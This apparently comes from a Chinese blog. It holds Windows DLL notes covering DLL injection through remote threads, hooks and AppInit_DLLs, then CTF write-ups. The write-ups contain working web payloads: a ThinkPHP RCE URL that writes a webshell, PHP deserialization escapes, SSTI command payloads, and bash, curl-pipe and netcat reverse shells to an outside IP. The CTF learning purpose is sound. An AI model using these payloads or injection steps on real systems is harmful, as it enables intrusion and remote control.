构建该 DLL 模块的时候，编译器会对每个源文件进程处理并生成一个 .obj 模块，每个源文件对应一个 .obj 模块 所有 .obj 模块构建完成后，链接器将所有 .obj 模块内容合并，产生一个单独的 DLL 映像文件，包含 DLL 中所有的二进制代码以及全局/静态变量 如果链接器检测到 DLL 源文件道出了至少一个函数活变量，那么链接器还会生成一个 .lib 文件，只列出了所有被导出的函数和变量的符号名，用于构建可执行模块 构建可执行模块： 在所有引用了导出的函数、变量、活符号的源文件中，包含上述 DLL 的头文件 创建 C/C++ 源文件实现功能 构建可执行模块时，编译器对每个源文件进行处理并生成一个 .obj 模块，没课源文件对应一个 .obj 模块 所有.obj模块构建完毕后，链接器把所有 .obj 模块的内容合并起来，产生一个单独的可执行映像文件，这个文件包含了可执行文件的所有二进制代码和全局/静态变量。除此以外，还包含一个导入段，包含它需要的 DLL 模块的名称和可执行文件的二进制代码从中引用的函数和符号名。操作系统加载程序会解析这个导入段 加载程序为新的进程创建一个虚拟地址空间，并将可执行模块映射到新进程的地址空间中，接着解析导入段，对导入段中每个 DLL进行定位，并映射到地址空间中 构建 DLL 模块应只从 DLL 模块导出函数，不应导出变量和C++类。 Mylib.h 1234567#ifdef MYLIBAPI#else#define MYLIBAPI extern &quot;C&quot; __declspec(dllimport)#endifMYLIBAPI int g_nResult;MYLIBAPI int Add(int nLeft, int nRight); MylibFile1.cpp 12345678910#include &lt;windows.h&gt;#define MYLIBAPI extern &quot;C&quot; __declspec(dllexport)#include &quot;Mylib.h&quot;int g_nResult;int Add(int nLeft, int nRight) { g_nResult = nLeft + nRight; return g_nResult;} 编译器看到 __declspec(dllexport 就知道应该在生成的 DLL 模块中导出该变量、函数或 C++ 类。需要被导出的变量和函数必须在头文件定义的前面加上MYLIBAPI extern &quot;C&quot;只有在编写 C++ 代码时才能使用，告诉编译器不要对函数名或变量名进行改变。 可执行文件不应在 DLL 的头文件之前定义MYLIBAPI。可执行模块中的MYLIBAPI会被头文件定义为declspec(dllimport)，这样编译器就知道需要从 DLL 模块中导入变量或函数。 构建可执行模块MyExeFile1.cpp 12345678910111213141516#include &lt;windows.h&gt;#include &lt;strsafe.h&gt;#include &lt;stdlib.h&gt;#include &quot;MyLib\\MyLib.h&quot;int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPSTR, int) { int nLeft = 10, nRight = 25; TCHAR sz[100]; StringCchPrintf(sz, _countof(sz), TEXT(&quot;%d + %d = %d&quot;), nLeft, nRight, Add(nLeft, nRight)); MessageBox(NULL, sz, TEXT(&quot;Calculation&quot;), MB_OK); StringCchPrintf(sz, _countof(sz,), TEXT(&quot;The result from the last Add is: %d&quot;), g_nResult); MessageBox(NULL, sz, TEXT(&quot;Last result&quot;), MB_OK);} 运行可执行模块启动一个可执行模块时，操作系统的加载程序会先为进程创建虚拟地址空间，接着把可执行模块映射到进程的地址空间中，之后加载程序会检查可执行程序的导入段，试图对所需的 DLL 进行定位并映射到进程的地址空间中。 导入段只包含 DLL 的名称，所以加载程序必须在用户的磁盘上搜索 DLL，顺序为： 包含可执行文件的目录 Windows 的系统目录 16 位 的系统目录 Windows 目录 进程的当前目录 PATH 环境变量中列出的目录 为了减少应用程序的载入时间，应该对自己的可执行模块和 DLL 模块进行基址重定位和绑定。 DLL 高级技术DLL 模块的显式载入和符号链接指在运行的过程中，显式地载入所需的 DLL 并显式地域想要输出的符号进行链接。 显式载入 DLL 模块使用以下两个函数将 DLL 映射到进程的地址空间 12345HMODULE LoadLibrary(PCTSTR pszDLLPathName);HMODULE LoadLibraryEx( PCTSTR pszDLLPathName, HANDLE hFile, DWORD dwFlags); 这两个函数会定位 DLL，并试图将该文件映像映射到调用进程的地址空间中。返回的 HMODULE 表示文件映像被映射到的虚拟内存地址。 dwFlags 参数可以执行标志。 显式卸载 DLL 模块当进程不需要引用 DLL 中的符号时，可以调用下面的函数显式卸载 DLL 1234BOOL FreeLibrary(HMODULE hInstDll);VOID FreeLibraryAndExitThread( HMODULE hInstDll, DWORD dwExitCode); 不应在 DLL 中使用单独的 FreeLibrary 和 ExitThread代替上述函数。 即使 LoadLibrary和LoadLibraryEx载入的 DLL 影视磁盘上的同一个文件，也不能将他们返回的映射地址互换使用。 显式地链接到导出符号通过调用以下函数在载入 DLL 后得到想要引用的符号地址 123FARPROC GetProcAddress( HMODULE hInstDll, PCSTR pszSymbolName); 有两种方式指定希望得到的符号的地址 1234// 通过符号名FARPROC pfn = GetProcAddress(hInstDll, &quot;SomeFuncInDll&quot;);// 通过序号,不推荐FARPROC pfn = GetProcAddress(hInstDll, MAKEINTOSOURCE(2)); 在使用返回的函数指针调用函数之前，需要将它转型称为域函数签名匹配的类型。 123456789typedef void (CALLBACK *PFN_DUMPMODULE)(HMODULE hModule)void DynamicDumpMoudle(HMODULE hModule); // 在 DLL 中PFN_DUMPMODULE pfDumoModule = (PFN_DUMPMODULE)GetProcAddress(hDll, &quot;DumpModule&quot;);if (pfnDumpModule != NULL) { pfnDumpModule(hDll);} DLL 的入口点函数一个 DLL 可以有一个入口点函数，系统会在不同的时候调用这个入口点函数。这些调用是通知性质的，通常被 DLL 用来执行一些域进程或线程有关的初始化和清理工作。入口点函数不是必须实现的。 1234567891011121314151617BOOL WINAPI DllMain(HINSTANCE hInstDll, DWORD fdwReason, PVOID fImpLoad) { switch (fdwReason) { case DLL_PROCESS_ATTACH: // DLL is being mapped into the process' address space break; case DLL_THREAD_ATTACH: // A thread is being created break; case DLL_THREAD_DETACH: // A thread is exiting cleanly break; case DLL_PROCESS_DETACH: / The DLL is being unmapped from the process' address space break; } return(TRUE); // Used only for DLL_PROCESS_ATTACH} hInstDll 包含该 DLL 实例的句柄，表示一个虚拟内存地址。通常将它保存在一个全局变量中，这样在调用资源载入函数时可以使用它。 fImpLoad 当 DLL 是显式载入时为 0，否则不为零。 fdwReason 表示系统调用入口点函数的原因。 DllMain 只应进行简单的初始化，应避免调用从其他 DLL 中导入的函数，避免在 DllMain 中使用 LoadLibrary(Ex) 和 FreeLibrary。 DLL_PROCESS_ATTACH系统第一次将一个 DLL 映射到进程的地址空间中会调用 DllMain 并传入 DLL_PROCESS_ATTACH。如果之后一个线程再调用 LoadLibrary(Ex) 载入一个已经被映射到进程的地址空间的 DLL，那么操作系统只会增加该 DLL 的使用计数。 DllMain 的返回值用来表示该 DLL 是否初始化成功，成功应返回 TRUE，如果 fdwReason 不是 DLL_PROCESS_ATTACH，返回值将被忽略。 创建新进程时，系统会分配进程地址空间并将 exe 文件映像及所需的 DLL 文件映像映射到地址的进程空间中。然后系统将创建进程的主线程并用这个线程来调用每个 DLL 的 DllMain 函数，同时传入 DLL_PROCESS_ATTACH，然后让进程的主线程喀什执行可执行模块的 C/C++ 运行时的启动代码，然后执行可执行模块的入口点函数。如果任何一个 DLL 的 DllMain 函数返回 FALSE，系统会把所有文件映像从地址空间中清除，然后终止整个进程。 显式载入时，进程调用 LoadLibrary(Ex) ，系统会对指定的 DLL 进行定位，并将该 DLL 映射到进程地址空间中，然后系统会用调用 LoadLibrary(Ex) 的线程调用 DLL 的 DllMain，并传入 DLL_PROCESS_ATTACH，当 DllMain 函数完成处理后，系统会让 LoadLibrary(Ex) 调用返回。如果 DllMain 返回 FALSE，系统会自动从进程的地址空间中撤销对 DLL 文件映像的映射，然后让 LoadLibrary 返回 NULL。 DLL_PROCESS_DETACH系统将一个 DLL 从地址空间撤销映射时，会调用 DLL 的 DllMain 函数，并在 fdwReason 中传入 DLL_PROCESS_DETACH。 只有当所有 DLL 都处理完 DLL_PROCESS_DETACH 之后，操作系统才会真正终止进程。 DLL_THREAD_ATTACH系统不会让进程的主线程用 DLL_THREAD_ATTACH 调用 DllMain，只会使用 DLL_PROCESS_ATTACH。 DLL_THREAD_DETACHDllMain 的序列化调用延迟载入 DLL函数转发器已知的 DLL注册表项HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs记录了已知的 DLL，操作系统载入它们时总会在同一个目录中查找。 DLL 重定向如果有一个SuperApp.exe文件，可以创建一个SuperApp.exe.local文件和一个.local文件夹。 LoadLibarary(Ex) 会检查这个文件是否存在，如果存在就会载入这个目录中的模块。 这个特性默认关闭，可能会使系统从应用程序的文件夹中载入伪造的系统 DLL。可以修改注册表HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Image File Execution Options，增加一个条目DWORD DevOverrideEnable并设置为 1 . 模块的基地址重定向如果 DLL 无法被加载到希望的基地址，系统会打开模块的重定位段并遍历其中的条目。对每一个条目，加载程序会先找到包含机器指令的那个存储页面，然后将模块的首选及地址域模块的实际映射地址之间的差值加到机器指令当前使用的内存地址上。 这样做存在两个缺点： 加载程序必须遍历重定位段并修改大量代码，损失性能 当加载程序写入到模块的代码页面时，系统的写时复制基址会强制这些页面以系统的页交换文件为后备存储器 模块的绑定线程局部存储区线程局部存储区（Thread Local Storage），将数据与线程关联起来。 动态 TLSWindows 中每个进程都有一组正在使用标志(in-use flag)，每个标志可设置为 FREE 或 INUSE，表示该 TLS 元素是否正在使用。至少有 TLS_MINIMUM_AVAILABLE 个标志可使用。 应用程序使用一组 4 个函数使用动态 TLS 1WORD TlsAlloc(); 对进程中的位标志进行检索，找到一个 FREE 标志。然后将该标志改为 INUSE，并返回该标志的索引，通常该索引存储在全局变量中。如果无法找到一个 FREE 标志，TlsAlloc 会返回 TLS_OUT_OF_INDEXS。 系统创建一个线程时，会分配 TLS_MINIMUL_AVAILABLE 个 PVOID 值，将他们初始化为 0，并与线程关联起来，每个线程都有自己的 PVOID 数组。TlsAlloc 返回的索引就是该线程此时可用的 PVOID 在数组中的索引。 123BOOL TlsSetValue( DWORD dwTlsIndex, PVOID pvTlsValue); 这个函数把 pvTlsValue 放入调用线程的 PVOID 数组中，成功返回 TRUE。 12PVOID TlsGetValue(DWORD dwTlsIndex);BOOL TlsFree(DWORD dwTlsIndex); TlsFree 会将进程内对应的标志位重新设置为 FREE，还会将所有线程中该元素的内容设置为 0。 静态 TLS1__declspec(thread) DOWRD t_dwStartTime = 0; 这样声明的变量必须是全局变量gt_或者静态变量st_ DLL 注入和 API 拦截DLL注入的一个例子简单来说，就是不能使用SetWindowLongPtr从另一个进程地址空间中创建的窗口中派生子窗口 使用注册表来注入 DLL1HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_Dlls 这个注册表键的值可能包含一个或多个 DLL 文件名（通过空格或逗号分隔）。第一个文件名可以包含路径，其他文件名的路径将被忽略。所以最好将自己的 DLL 放到 Windows 系统目录中。 当 User32.dll 映射到一个新的进程时，会收到 DLL_PROCESS_ATTACH 通知，此时它取出上述注册表键的值，并调用 LoadLibrary 载入这个字符串中指定的每个 DLL。被注入的 DLL 是在进程生命期的早期载入的，调用其他函数时应慎重，Kernel32.dll 中的函数基本可以正常使用。 缺点： 这个 DLL 只会被映射到使用了 User32.dll 的进程中，对于多数使用 CUI 的程序不可行 每个基于 GUI 的进程都载入了这个 DLL，如果这个 DLL 出错影响会很大 在进程早期就注入了 DLL，使用后应该卸载这个 DLL 使用 Windows 挂钩来注入 DLL进程 A 需要查看系统中各窗口处理了哪些消息，它通过安装 hook 注入 dll 1HHOOK hHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hInstDll, 0); 第一个参数表示安装 hook 的类型，第二个参数时函数地址（在该进程的地址空间中），窗口即将处理消息时，会调用这个函数。第三个参数标识一个 DLL，这个 DLL 包含了 GetMsgProc 函数，hInstDll 的值时进程地址空间中 DLL 被映射到的虚拟内存地址。最后一个参数 0 表示给哪个进程安装挂钩。一个线程可能调用SetWindowHookEx并传入另一个线程的标识符。如果传入0，表示要给系统中所有 GUI 线程安装挂钩。 运行过程： 进程 B 的一个线程准备向一个窗口发送一条消息 系统检查该线程是否安装了 WH_GETMESSAGE 挂钩 系统检查 GetMsgProc 所在的 DLL 是否被映射到了进程 B 的地址空间中 如果该 DLL 还未被映射，那么系统会强制该 DLL 映射到进程 B 的地址空间中，并将进程 B 中该 DLL 的锁计数器（lock count）递增 由于 DLL 的 hInstDll 是在进程 B 中映射的，系统会检查该 DLL在两个进程中的位置是否相同。如果相同，那么系统可以直接在 A 的地址空间中调用 GetMsgProc；如果不同，系统必须确定 GetMsgProc 在进程 B 的地址空间中的虚拟地址（GetMsgProc B = hInstDll B + (GetMsgProc A + hInstDll A)） 系统在进程 B 中递增该 DLL 的所计数器 系统在进程 B 中调用 GetMsgProc 函数 GetMsgProc 返回时，系统递减该 DLL 在进程 B 中的锁计数器 系统把挂钩过滤函数（hook filter function）所在的 DLL 注入或映射到地址空间中时，会映射整个 DLL 而不仅仅是挂钩过滤函数。 相比于使用注册表注入，该方法可以在不再需要该 DLL 时撤销映射 1BOOL UnhookWindowsHookEx(HHOOK hHook); 调用该函数时，系统遍历内部一个已经注入过该 DLL 的进程列表，并递减该 DLL 的锁计数器。当锁计数器递减到 0 的时候，系统会自动从进程的地址空间中撤销对该 DLL 的映射。锁计数器的意义在于防止进程 B 中的一个线程执行 GetMsgProc 时，另一个线程调用 UnhookWindowsHookEx，引发内存访问违规。 使用远程线程注入 DLL第三种方法是使用远程线程（remote thread），提供了最高的灵活性。 根本上来说，DLL 注入要求目标线程中的一个线程调用 LoadLibrary 载入我们想要的 DLL。这种方法要求我们在目标进程中创建一个新的线程，使用CreateRemoteThread。 12345678HANDLE CreateRemoteThread( HANDLE hProcess, PSECURITY_ATTRIBUTES psa, DWORD dwStackSize, PTHREAD_START_ROOTINE pfaStartAddr, PVOID pvParam, DWORD fdwCreate, PDWORD pdwThreadId); 除了第一个参数外，其余参数与 CreateThread 完全相同。第一个参数表示新建的进程由哪个进程所有。pfaStartAddr 是线程函数的内存地址，这个地址应该在远程进程（remote process）的地址空间中，而不是自己进程的空间中。 创建线程后，接下来需要调用 LoadLibrary 函数载入自己的 DLL。如果 DLL 名称以 ANSI 字符串存储就调用 LoadLibraryA，以 Unicode 存储就调用 LoadLibraryW。 LoadLibrary 与线程函数的函数原型基本相同，所以可以将线程函数的地址设置为 LoadLibraryA 或者 LoadLibraryW 的地址。 123HANDLE hThread = CreateRemoteThread(hProcessRemote, NULL, 0, LoadLibraryW, L&quot;C:\\\\MyLib.dll&quot;, 0, NULL);// 或者HANDLE hThread = CreateRemoteThread(hProcessRemote, NULL, 0, LoadLibraryA, &quot;C:\\\\MyLib.dll&quot;, 0, NULL); 此时还存在两个问题。 第一个是编译链接生成一个程序时，胜澈的二进制文件包含一个导入段。这个段由一系列传唤函数（thunk）构成，转换函数用于跳转到导入的函数。代码调用 LoadLibraryW 制类的函数时，链接器会生成一个调用，来调用我们模块中导入段的一个转换函数，转换函数之后会跳转到实际的函数。 如果直接引用 LoadLibraryW，该引用会被解析为模块导入段的 LoadLibraryW 的转换函数的地址。这个地址在远程线程中并不是 LoadLibraryW 的真正地址。所以必须通过 GetProcAddress 得到 LoadLibraryW 的确切地址。 每个应用程序都需要 Kernel32.dll，每个进程中 Kernel32.dll 都会被映射到同一个地址，但重启后可能改变。应像下面这样调用 CreateRemoteThread 123//Get the real address of LoadLibraryWPTHREAD_START_ROUTINE pfnThreadRth = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);Handle hThread = CreateRemoteThread(hProcessRemote, NULL, 0, pfnThreadRtn, L&quot;C:\\\\MyLib.dll&quot;, 0, NULL); 第二个问题是字符串&quot;C:\\\\MyLib.dll&quot;位于调用进程的地址空间中。我们需要为 CreateRemoteThread 传入在远程进程的地址空间中存放字符串的地址。使用VirtualAlloc在另一个进程中分配空间 123456PVOID VirtualAllocEx( HANDLE hProcess, PVOID pvAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); 使用VirtualFree释放这块空间 12345BOOL VirtualFreeEx( HANDLE hProcess, PVOID pvAddress, SIZE_T dwSize, DWORD dwFreeType); 在另一个进程中分配空间后，还需要把字符串复制到该进程空间中。以下函数允许一个进程对另外一个进程的地址空间进行读写 12345678910111213BOOL ReadProcessMemory( HANDLE hProcess, LPCVOID pvAddressRemote, PVOID pvBufferLocal, SIZE_T dwSize, Size_T* pdwNumBytesRead);BOOL WriteProcessMemory( HANDLE hProess, PVOID pvAddressRemote, LPCVOID pvBufferLocal, SIZE_T dwSize, SIZE_T* pdwNumBytesWritten); 使用远程线程注入 DLL 的步骤如下 用 VirtualAllocEx 在远程进程的地址空间中分配一块内存 用 WriteProcessMemory 函数把 DLL 的路径名复制到上述空间中 用 GetProcAddress 获取 LoadLibraryW （在 Kernel32 中）的实际地址 用 CreateRemoteThread 在远程进程中创建一个线程，让新线程调用正确的 LoadLibraryW 并在参数中传入第一步分配的内存地址。 用于注入的 DLL 的 DllMain 函数会受到 DLL_PROCESS_ATTACH 并可以执行需要的代码。当 DllMain 返回时，远程线程会从 LoadLibrary 返回到 BaseThreadStart 函数，这个函数执行 ExitThread，线程终止 使用 VirtualFreeEx 释放第一步分配的内存 使用 GetProcAddress 获取 FreeLibrary 的实际地址 使用 CreateRemoteThread 在远程进程中创建一个线程，让远程线程调用 FreeLibrary，并在参数中传入远程 DLL 的HMODULE 使用木马 DLL 来注入 DLL另一种方式是，如果我们知道这个进程一定会载入某个 DLL，我们可以创建自己的 DLL 并给它起相同的文件名，然后替换掉原来的 DLL。 把 DLL 作为调试器注入使用 CreateProcess 来注入代码API 拦截的一个例子","link":"/2021/01/19/windows/"},{"title":"CTF Writeup","text":"尽量写吧 new bugkuwebweb14提示备份了不少东西，用Githack得到flag。 web15提示vim编辑器，想到源码泄露。输入swp，把1改成i，得到flag。 web20正则匹配动态密文，提交时要使用session或者cookie 123456789101112import requestsimport reurl = 'http://123.206.31.85:10020/'s = requests.session()r = s.get(url).text# print(r)ma = re.search(r'([a-z0-9]{33})',r)# print(ma)param = {'key':ma.group(0)}r = s.get(url,params=param).textprint(r) 安恒月赛2020 4Ezunserialize123456789101112131415161718192021222324252627282930313233343536373839 &lt;?phpshow_source(&quot;index.php&quot;);function write($data) { return str_replace(chr(0) . '*' . chr(0), '\\0\\0\\0', $data);}function read($data) { return str_replace('\\0\\0\\0', chr(0) . '*' . chr(0), $data);}class A{ public $username; public $password; function __construct($a, $b){ $this-&gt;username = $a; $this-&gt;password = $b; }}class B{ public $b = 'gqy'; function __destruct(){ $c = 'a'.$this-&gt;b; echo $c; }}class C{ public $c; function __toString(){ //flag.php echo file_get_contents($this-&gt;c); return 'nice'; }}$a = new A($_GET['a'],$_GET['b']);//省略了存储序列化数据的过程,下面是取出来并反序列化的操作$b = unserialize(read(write(serialize($a)))); 处理过程中只要存在 \\0\\0\\0 这6个字符就会替换成 chr(0)*chr(0) 这3个字符，反序列化过程中会根据长度进行反序列化，就有了逃逸的空间。 最后在 class C 中 toString 方法可以读取 flag.php，class B 中有 echo ，echo 一个 class C 的实例就可以输出了。 1234567891011import requestsurl = 'http://183.129.189.60:10001/'a = '\\\\0\\\\0\\\\0'*8b = 'x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}'r = requests.get(url, params={'a': a, 'b': b})print(r.url)print(r.text)#O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:2:&quot;un&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}#O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:2:&quot;un&quot;;s:8:&quot;password&quot;;s:56:&quot;x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}} 攻防世界webbaby web提示想想首页是哪个，访问index.php，跳转回 1.php，抓个包，repeater里重放，看到返回的header里面有flag php rcethinkphp 5 的漏洞（https://www.vulnspy.com/cn-thinkphp-5.x-rce/） 1http://111.198.29.45:30031/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%27%3C?php%20@eval($_POST[c]);?%3E%27%20%3E%20info.php 写入一个shell到info.php，蚁剑连接，根目录下有flag web2123456789101112&lt;?php$s = 'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$_o = base64_decode(strrev(str_rot13($s)));for($_0=0;$_0&lt;strlen($_o);$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; }echo strrev($_);?&gt; Reversecsaw2013reversing2执行发现flag是乱码，IDA打开，lpMem存着flag，如果执行到if里面程序就会退出，执行不到messagebox，同时if里面还有好像是处理flag的函数。所以想执行了这个函数之后再执行messagebox，这样就能打印出flag。拖进od，执行到程序设定的断点，nop掉最近的跳转（否则会执行之前的messagebox），接下来执行处理flag的函数，之后跳转到exitprocess，把这个跳转转到messagebox，一共有两个，都试一遍，在第二个得到flag。 dmd-50IDA，发现一串字符串 780438d5b6e29db0898bc4f0225935c0，是上面MD5加密得到的，拖去解密，是grape的两次MD5，再把grape加密一次，得到flag re1拖进OD，搜索字符串 game先运行一遍，像是玩一个游戏，把灯全点亮可以拿到flag。拖进OD，搜索字符串，看到 “done！the flag is”这里，找到跳转进来的位置，记下开始（push ebp）的地址（00C5E940），再到提示选项的地方（1，△），到这一段的开始（push ebp），改成jmp 00C5E940。 getitIDA发现它把东西写入了 /tmp/flag.txt，在remove下断点，去flag.txt看，发现是假的= =。重新看，是一个简单的算法，用python写一下，得到flag 12345678s = 'c61b68366edeb7bdce3c6820314b7498't = r'SharifCTF{????????????????????????????????}'for v5 in range(len(s)): if v5%2: v3 = 1 else: v3 = -1 print(chr(ord(s[v5])+v3),end='') 最后要加上格式 SharifCTF{} Hello Ctf运行，提示输入序列号，随便输，wrong。IDA里打开，发现一串字符串，向下看发现是把输入转换一下和之前的字符串比较，一致就会给出success。 Open Sourcearg1 = 0xcafe arg2 = 25 arg3 = h4cky0u，打印得到flag insanityIDA看一下，好像是把flag和随机数运算一下输出出来，shift F12得到flag logmeinIDA，在主函数的for循环处是算法部分，用c语言照着写下来。 123456789101112#include &lt;stdio.h&gt;int main(){ char s[] = &quot;:\\&quot;AL_RT^L*.?+6/46&quot;; long long t = 28537194573619560LL; char * tp = (char *)&amp;t; for(int i=0;s[i];i++) { printf(&quot;%c&quot;,s[i]^tp[i%7]);}} maze找到关键函数 sub400690，O:a2-1,o:a2+1,.:a3-1,0:a3+1，a1是地图，走出来把方向记下来，得到flag no strings attached32位的elf文件，拖到linux虚拟机里执行一下，出错了。放进IDA，看到4各函数，最后一个把输入和解密之后的数据比较一下，一样会输出success。看一下汇编，decrypt函数运行后有 mov [ebp+s2],eax，解密后的flag在eax里。用gdb，b decrypt,r,n,i r,x/6sw $eax，以word（4字节），字符串形式显示6行，看到flag。 python trade找个在线的pyc反编译网站，看到一个编码算法，反着写出来，得到flag 1234567891011import base64correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'def decode(s): s = base64.b64decode(s) res = '' for c in s: x = c-16 res += chr(x^32) return resprint(decode(correct)) ShuffleIDA看一下，是一个字符数组，转换成char就拿到了flag simple unpackIDA二进制方式打开，搜索flag，或者用upx脱壳后再打开，可以直接看到flag。 BUUCTFweb[ACTF2020 新生赛]BackupFile提示有源文件，index.php.bak，然后就是一个弱类型，key=123。 [ASIS 2019]Unicorn shop查看源代码，说UTF-8很重要。输入4，1337，提示只能输入一个字符。查一下Unicode，Unicode - Compart，随便找一个比1337大的，取UTF8编码，比如0xF0 0x90 0xA1 0x9F。输入4, %F0%90%A1%9F，得到flag [安洵杯 2019]easy_web看到img=…，可能存在文件包含，base64解密两次，ASCII Hex解密一次，得到555.pnf0？换成index.php加密回去，在img标签的src里看见base64之后的源码。 cmd参数可以执行系统命令，过滤了常用的读取文件的命令。可以使用ca/t f/lag，也可以用sort flag. 下面是一个强类型的md5碰撞，使用fastcoll，.\\fastcoll_v1.0.0.5.exe -o 1.txt 2.txt，生成两个md5内容相同的文件。 1234567891011import requestswith open(r'C:\\Users\\&lt;user&gt;\\Desktop\\1.txt','rb') as f1: with open(r'C:\\Users\\&lt;user&gt;\\Desktop\\2.txt','rb') as f2: a = f1.read() b = f2.read() url = 'http://9c2738e0-05e7-4936-839d-286bde014ef5.node3.buuoj.cn/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=' cmd = r'sort /flag' data = {'a': a,'b': b} r = requests.post(url+cmd, data=data) print(r.text) 读取文件时要用绝对路径，否则会找不到文件，原因不明。 [BJDCTF 2nd]fake google随便输点什么，看到提示 SSTI。 1{{1+1}} 能看到结果，直接 tplmap，得到flag。 [安洵杯 2019]easy_serialize_php123456789101112131415161718192021222324252627282930 &lt;?php$function = @$_GET['f'];function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);}if($_SESSION){ unset($_SESSION);}$_SESSION[&quot;user&quot;] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function){ echo '&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;';}if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png');}else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));}$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file'){ highlight_file('index.php');}else if($function == 'phpinfo'){ eval('phpinfo();'); //maybe you can find something in here!}else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));} 从后往前看，假设文件在./flag.php，目的是执行file_get_contents('./flag.php')，usrinfo来自filter和反序列化的$_SESSION，filter删除特定的字符串。由于是先反序列化后过滤，本来不属于变量的一部分的字符串可能被收进变量中。extract可以用于覆盖变量。 没有成功，原来文件不是flag.php。 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&amp;function=show_image filter会删除flag，img被反序列化。得到flag的位置，改一下payload就可以了。 [BJDCTF2020]EasySearch存在 .swp 备份，先爆破 md6 1234567import hashlibdef md5(s): return hashlib.md5(s.encode('utf-8')).hexdigest()for i in range(1, 10000000): if md5(str(i)).startswith('6d0bc1'): print(i) break 得到2020666，在返回包头看见文件，进入。这个文件是一个 shtml 文件，存在模板注入。 返回 index，用户名处输入payload 1&lt;!--#exec cmd=&quot;命令&quot;--&gt; # 此处使用 ls 发现文件 flag ，访问可以得到flag [BJDCTF 2nd]Schrödinger有个爆破密码的功能，扫下目录发现 test.php，应该是要用这个功能爆破 test 的密码。 看一下 cookie，有个 base64加密的值，user=1589337171，不知道是什么，先改一改，改成999999999999999999，刷新发现页面变了 12Already burst -999999998410662300 sec, 122930 p/sForecast success rate NaN% 刚才的 user 应该是时间，但是改完变成负的了，再改成0试试。 12Already burst 1589337868 sec, 142033 p/sForecast success rate 99.57694165675845% 再 check 成功了，弹出密码av11664517@1583985203，查一下这个av号，是北京大学量子力学的视频，flag 在评论里，脚本跑一下。 [BJDCTF 2nd]duangShell下载源代码.index.php.swp，使用 vim -r index.php.swp恢复 12345678910111213141516&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST['girl_friend'])) { die(&quot;where is P3rh4ps's girl friend ???&quot;);} else { $girl = $_POST['girl_friend']; if (preg_match('/\\&gt;|\\\\\\/', $girl)) { die('just girl'); { } else if (preg_match('/ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$/i', $girl)) {} {echo &quot;&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;&quot;; } else { //duangShell~~~~ exec($girl); }} 过滤了符号，不能使用变量拼接。禁用了 base64 ，也不能编码绕过。需要反弹sehll 申请小号，开一个 linux lab，在 /var/www/html下写反弹shell 1echo 'bash -i &gt;&amp; /dev/tcp/174.1.54.235/4444 0&gt;&amp;1' &gt; a 监听 1nc -lvvp 4444 到 web 页面 POST 1girl_friend=curl http://174.1.54.235/a|bash 遇到了问题，bash 会自动退出，原因不明，改成 nc 反弹 shell，监听 1nc -lvvp 9999 POST 1girl_friend=nc 174.1.54.235 9999 -e /bin/bash 成功得到shell 12find / -name flagcat /etc/demo/P3rh4ps/love/you/flag [BJDCTF2020]Cookie is so stable提示 cookie，在 flag 页面输入 admin，刷新抓包可以看到 cookie 里面有一个 user 字段，同时页面上显示 Hello，admin。输入 1{{1+1}} 得到2，模板注入。burp 里把 user 字段改成下面的值 1{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /flag&quot;)}}; [BJDCTF2020]ZJCTF，不过如此代码审计，/?text=php://input&amp;file=php://filter/read/convert.base64-encode/resource=next.php，POST I have a dream，得到 next.php 源码，也可以用data://text/plain,I%20have%20a%20dream next.php 存在带 /e的 preg_replace，/next.php?\\S*=${getFlag()}&amp;cmd=system('cat /flag'); [BJDCTF2020]The mystery of ipHint 里提到知道 IP，抓包改 XFF，显示的 IP 就会变，想到模板注入 1X-Forwarded-For: {{1+1}} 显示了2，确实存在模板注入，模板是 Smarty 1X-Forwarded-For: {{system(&quot;cat /flag&quot;)}} [BJDCTF 2nd]简单注入打个引号就告诉我 Stop hacking，看下 robots.txt，有 hint.txt 1234Only 